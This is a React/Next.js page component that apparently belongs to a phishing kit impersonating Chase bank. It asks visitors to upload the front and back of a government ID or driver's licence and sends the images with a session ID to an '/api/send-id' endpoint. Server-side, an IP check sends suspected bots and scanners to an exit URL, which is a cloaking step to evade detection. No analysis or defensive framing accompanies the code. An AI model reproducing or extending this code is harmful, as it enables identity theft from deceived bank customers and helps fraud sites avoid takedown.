import { Button, styled, Typography } from "@mui/material";
import { Box } from "@mui/system";
import axios from "axios";
import { GetServerSideProps } from "next";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useState } from "react";
import { useForm } from "react-hook-form";
import { Content } from "../components/Content";
import { CustomButton } from "../components/CustomButton";
import { SubTitle } from "../components/SubTitle";
import { Title } from "../components/Title";
import { Wrapper } from "../components/Wrapper";
import checkIp from "../middleware/checkIp";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";

interface UploadDocsProps {}

export const UploadDocs: React.FC<UploadDocsProps> = ({}) => {
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
    resetField,
  } = useForm({
    mode: `all`,
  });

  const { push } = useRouter();

  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    const formData = new FormData();

    formData.append(`front`, data.front[0]);
    formData.append(`back`, data.back[0]);
    formData.append(`form`, `DOCUMENTS`);
    formData.append(`sessionId`, datas.sessionId);

    await axios.post(`/api/send-id`, formData);
    setLoading(false);
    setData({
      ...datas,
      docs: {
        front: data.front[0],
        back: data.back[0],
      },
    });

    const url = getProgress()[getProgress().indexOf(`DOCUMENT`) + 1];

    push(getNextUrl(url));
  });

  return (
    <Wrapper current="DOCUMENT">
      <Box width="100%" padding="1rem">
        <Head>
          <title>Identification - chase.com</title>
        </Head>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            padding: "2rem",
          }}
        >
          <Box marginBottom="1.5rem">
            <Typography
              component="h2"
              sx={{
                fontSize: "1.5rem",
                marginBottom: "1rem",
              }}
            >
              Upload supporting documents
            </Typography>
            <SubTitle subTitle="Upload a government issued identity document or driver's licence." />
          </Box>
          <Box>
            <Title title="Front" />
            <Content>
              <Box
                flex={1}
                width={["100%", "initial"]}
                component="label"
                htmlFor="contained-button-file-front"
              >
                <Input
                  accept="image/*"
                  id="contained-button-file-front"
                  type="file"
                  {...register("front", {
                    required:
                      "Please upload the back picture of your ID/Driver's licence",
                  })}
                />
                {watch("front") && watch("front").length ? (
                  <Box>
                    <Typography color="#666" marginRight="5px">
                      {watch("front")[0].name}
                    </Typography>
                    <Button
                      component="span"
                      sx={{
                        paddingLeft: 0,
                        textTransform: "capitalize",
                      }}
                    >
                      Change
                    </Button>
                  </Box>
                ) : (
                  <Button
                    component="span"
                    color={errors && errors["front"] ? "error" : "primary"}
                    sx={{
                      paddingLeft: 0,
                      textTransform: "capitalize",
                      fontWeight: errors && errors["front"] ? 700 : 300,
                    }}
                  >
                    Select file
                  </Button>
                )}
              </Box>
            </Content>
          </Box>
          <Box marginTop="1.5rem">
            <Title title="Back" />
            <Content>
              <Box
                flex={1}
                width={["100%", "initial"]}
                component="label"
                htmlFor="contained-button-file-back"
              >
                <Input
                  accept="image/*"
                  id="contained-button-file-back"
                  type="file"
                  {...register("back", {
                    required:
                      "Please upload the back picture of your ID/Driver's licence",
                  })}
                />
                {watch("back") && watch("back").length ? (
                  <Box>
                    <Typography color="#666" marginRight="5px">
                      {watch("back")[0].name}
                    </Typography>
                    <Button
                      component="span"
                      sx={{
                        paddingLeft: 0,
                        textTransform: "capitalize",
                      }}
                    >
                      Change
                    </Button>
                  </Box>
                ) : (
                  <Button
                    component="span"
                    color={errors && errors["back"] ? "error" : "primary"}
                    sx={{
                      paddingLeft: 0,
                      textTransform: "capitalize",
                      fontWeight: errors && errors["back"] ? 700 : 300,
                    }}
                  >
                    Select file
                  </Button>
                )}
              </Box>
            </Content>
          </Box>
          <Box marginTop="1.5rem">
            <Typography
              component="p"
              sx={{
                color: "#666",
                fontSize: [".8125rem", ".875rem"],
              }}
            >
              We will verify your information with the one in our system.
            </Typography>
          </Box>
          <Box
            width="100%"
            sx={{
              display: "flex",
              justifyContent: "flex-end",
              marginTop: "1.5rem",
            }}
          >
            <Box width={["100%", "30%"]}>
              <CustomButton
                text="Finish"
                onClick={onSubmit}
                disabled={loading}
              />
            </Box>
          </Box>
        </Box>
      </Box>
    </Wrapper>
  );
};

const Input = styled("input")({
  display: "none",
});

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
          redirect: {
            destination: process.env.NEXT_PUBLIC_EXIT_URL,
            permanent: false,
          },
        }
      : {}),
  };
};

export default UploadDocs;
